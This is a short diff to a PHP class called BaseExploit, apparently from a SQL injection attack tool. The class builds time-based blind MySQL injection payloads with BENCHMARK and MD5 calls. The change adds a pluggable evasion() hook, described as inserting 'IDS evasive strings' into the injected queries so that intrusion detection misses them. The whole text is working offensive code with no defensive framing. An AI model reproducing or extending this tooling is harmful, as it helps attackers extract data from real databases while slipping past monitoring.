@@ -6,6 +6,17 @@ abstract class BaseExploit
 	static $benchmark=1024; //number to be used in benchmark for blind
 	static $threshold=1;	//number of seconds to succeed on blind
 	static $roundtrip=1; 	//time of a single request to the host
+	static $evasionFunction=null;
+	/**
+	 * adds IDS evasive strings, call wherever you can in the query
+	 */
+	protected function evasion($length=100)
+	{
+		if (isset(self::$evasionFunction))
+			return call_user_func_array(self::$evasionFunction, array($length));
+		else
+			return "";
+	}
 	protected function fastEnough($time)
 	{
 		//half the threshold is slow enough, considering that threshold is 5 times the roundtrip
@@ -25,7 +36,7 @@ abstract class BaseExploit
 	}
 	protected function benchmark()
 	{
-		return "BENCHMARK(".self::$benchmark.",MD5({$this->signatureMysql()}))";
+		return "BENCHMARK(".self::$benchmark.",{$this->evasion()}MD5({$this->signatureMysql()}))";
 	}
 	private $timer=null;
 	protected function timein()
